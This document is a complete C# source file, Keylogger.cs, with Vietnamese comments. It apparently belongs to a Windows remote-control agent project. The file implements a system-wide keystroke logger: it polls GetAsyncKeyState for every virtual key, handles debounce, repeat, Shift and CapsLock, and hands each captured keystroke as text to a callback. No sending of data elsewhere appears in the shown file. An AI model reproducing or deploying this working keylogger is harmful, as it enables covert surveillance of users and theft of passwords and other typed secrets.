// -----------------------------------------------------------------------------
// File: Keylogger.cs
// Description: Định nghĩa dịch vụ theo dõi phím
// Mục đích: Cung cấp chức năng theo dõi các thao tác trên bàn phím, xử lý việc
//           giữ phím (repeat) và chống nảy phím (debounce).
// -----------------------------------------------------------------------------

using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms; // Lưu ý: Cần tham chiếu thư viện System.Windows.Forms để dùng Enum Keys

namespace RCS.Agent.Services.Windows
{
    public class Keylogger
    {
        #region --- CONFIGURATION (CẤU HÌNH) ---

        // Thời gian chờ trước khi bắt đầu lặp lại phím khi người dùng giữ phím (Delay trước khi repeat)
        private const int REPEAT_DELAY_MS = 600;

        // Tốc độ lặp lại phím khi đang giữ (Interval giữa các lần repeat)
        private const int REPEAT_INTERVAL_MS = 200;

        // Thời gian tối thiểu giữa lần nhả phím và lần nhấn tiếp theo để coi là hợp lệ (Chống double-click do phần cứng)
        private const int DEBOUNCE_TIME_MS = 50;

        #endregion

        #region --- STATE MANAGEMENT (QUẢN LÝ TRẠNG THÁI) ---

        private CancellationTokenSource _cts;
        private Action<string> _onKeyPressed;

        // Mảng lưu trạng thái phím: True = Đang nhấn, False = Đã nhả
        private readonly bool[] _prevKeyStates = new bool[256];

        // Mảng lưu thời gian lần cuối GỬI phím (dùng để tính toán việc lặp phím)
        private readonly DateTime[] _lastPressTimes = new DateTime[256];

        // Mảng lưu thời gian lần cuối NHẢ phím (dùng để tính toán chống nảy - debounce)
        private readonly DateTime[] _lastReleaseTimes = new DateTime[256];

        #endregion

        #region --- NATIVE WIN32 API ---

        // Hàm lấy trạng thái phím bất đồng bộ từ hệ thống (trả về trạng thái hiện tại ngay thời điểm gọi)
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        // Hàm lấy trạng thái khóa của phím (như CapsLock, NumLock, ScrollLock)
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        #endregion

        #region --- PUBLIC METHODS (INTERFACE) ---

        /// <summary>
        /// Bắt đầu quá trình theo dõi phím.
        /// </summary>
        /// <param name="onKeyPressed">Callback xử lý khi một phím được nhấn.</param>
        public void Start(Action<string> onKeyPressed)
        {
            if (_cts != null) return; // Nếu đang chạy thì không start lại

            _cts = new CancellationTokenSource();
            _onKeyPressed = onKeyPressed;

            // Xóa sạch trạng thái cũ để tránh lỗi logic khi khởi động lại
            Array.Clear(_prevKeyStates, 0, _prevKeyStates.Length);
            Array.Clear(_lastPressTimes, 0, _lastPressTimes.Length);
            Array.Clear(_lastReleaseTimes, 0, _lastReleaseTimes.Length);

            // Chạy vòng lặp trong một Task riêng biệt để không chặn luồng chính
            Task.Run(async () => await RealKeylogLoop(_cts.Token));
        }

        /// <summary>
        /// Dừng quá trình theo dõi.
        /// </summary>
        public void Stop()
        {
            _cts?.Cancel();
            _cts = null;
        }

        #endregion

        #region --- CORE LOGIC (VÒNG LẶP XỬ LÝ) ---

        private async Task RealKeylogLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                // Quét qua bảng mã ASCII (từ 8 đến 255 - bỏ qua các mã điều khiển đầu tiên)
                for (int i = 8; i < 256; i++)
                {
                    // GetAsyncKeyState trả về short (16 bit).
                    // Kiểm tra Bit cao nhất (Most Significant Bit - MSB) bằng phép AND với 0x8000.
                    // Nếu bit này là 1 -> Phím đang được nhấn xuống (Physically Down).
                    bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;
                    bool wasDown = _prevKeyStates[i];
                    var now = DateTime.Now;

                    if (isDown)
                    {
                        // --- TRƯỜNG HỢP 1: PHÍM MỚI ĐƯỢC NHẤN (Transition: Up -> Down) ---
                        if (!wasDown)
                        {
                            // Kiểm tra Debounce: Tính thời gian từ lần nhả phím trước đó đến hiện tại
                            double msSinceRelease = (now - _lastReleaseTimes[i]).TotalMilliseconds;

                            if (msSinceRelease > DEBOUNCE_TIME_MS)
                            {
                                // Hợp lệ -> Xử lý phím
                                ProcessKey(i);

                                // Thiết lập thời gian cho lần lặp lại đầu tiên (Delay ban đầu)
                                _lastPressTimes[i] = now.AddMilliseconds(REPEAT_DELAY_MS);
                            }
                            else
                            {
                                // Bỏ qua do nhấn quá nhanh sau khi nhả (Nhiễu tín hiệu hoặc phím nảy)
                            }
                        }
                        // --- TRƯỜNG HỢP 2: PHÍM ĐANG ĐƯỢC GIỮ (Holding) ---
                        else if (wasDown && now >= _lastPressTimes[i])
                        {
                            // Đã vượt qua thời gian chờ -> Kích hoạt lặp lại phím
                            ProcessKey(i);

                            // Thiết lập thời gian cho lần lặp tiếp theo (Tốc độ lặp)
                            _lastPressTimes[i] = now.AddMilliseconds(REPEAT_INTERVAL_MS);
                        }

                        // Cập nhật trạng thái hiện tại là đang nhấn
                        _prevKeyStates[i] = true;
                    }
                    else
                    {
                        // --- TRƯỜNG HỢP 3: PHÍM ĐƯỢC NHẢ RA (Transition: Down -> Up) ---
                        if (wasDown)
                        {
                            // Ghi lại thời điểm nhả phím để dùng cho việc tính Debounce lần sau
                            _lastReleaseTimes[i] = now;
                        }
                        
                        // Cập nhật trạng thái hiện tại là đã nhả
                        _prevKeyStates[i] = false;
                    }
                }

                // Delay ngắn 20ms để giảm tải CPU nhưng vẫn đảm bảo độ nhạy (khoảng 50 lần quét/giây)
                await Task.Delay(20, token);
            }
        }

        #endregion

        #region --- HELPER METHODS (XỬ LÝ CHUỖI) ---

        private void ProcessKey(int vKey)
        {
            string keyStr = "";
            Keys key = (Keys)vKey; // Ép kiểu int về Enum Keys của .NET

            // Bỏ qua các phím chuột (Mouse Buttons)
            if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) return;

            // Xử lý các phím đặc biệt để hiển thị tường minh hơn
            if (key == Keys.Enter) keyStr = "\n[ENTER]\n";
            else if (key == Keys.Space) keyStr = " ";
            else if (key == Keys.Back) keyStr = "[BACK]";
            else if (key == Keys.Tab) keyStr = "[TAB]";
            // Bỏ qua việc in tên các phím bổ trợ khi chúng đứng một mình (chỉ quan tâm tác dụng phối hợp của chúng)
            else if (key == Keys.LShiftKey || key == Keys.RShiftKey || key == Keys.ShiftKey ||
                     key == Keys.LControlKey || key == Keys.RControlKey || key == Keys.ControlKey ||
                     key == Keys.LMenu || key == Keys.RMenu || key == Keys.Menu)
            {
                return;
            }
            // Xử lý các ký tự in được (A-Z, 0-9)
            else if (key.ToString().Length == 1)
            {
                // Kiểm tra trạng thái Shift và CapsLock để xác định hoa/thường
                // Bit 0x8000 của Shift: Shift đang được giữ
                bool shift = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                // Bit 1 (LSB) của CapsLock: CapsLock đang bật (Toggled)
                bool caps = (GetKeyState((int)Keys.CapsLock) & 1) != 0;

                if (key >= Keys.A && key <= Keys.Z)
                {
                    // Logic XOR (^): Nếu chỉ có Shift HOẶC chỉ có Caps -> Viết hoa. 
                    // Nếu cả hai (Shift + Caps) hoặc không có gì -> Viết thường.
                    // Lưu ý: Enum Keys mặc định là chữ hoa.
                    if (shift ^ caps) keyStr = key.ToString(); 
                    else keyStr = key.ToString().ToLower();
                }
                else if (key >= Keys.D0 && key <= Keys.D9)
                {
                    // Các phím số trên hàng phím chữ thường có tên là D0, D1... -> Cần cắt bỏ chữ "D"
                    // (Lưu ý: Chưa xử lý ký tự đặc biệt trên phím số như @, #, $ khi nhấn Shift vì phức tạp hơn)
                    keyStr = key.ToString().Replace("D", "");
                }
                else
                {
                    keyStr = key.ToString();
                }
            }
            // Các phím chức năng khác (F1, Home, End...) -> Đóng ngoặc để dễ nhìn
            else
            {
                keyStr = $"[{key}]";
            }

            // Gửi kết quả ra ngoài thông qua Action callback
            if (!string.IsNullOrEmpty(keyStr))
            {
                _onKeyPressed?.Invoke(keyStr);
            }
        }

        #endregion
    }
}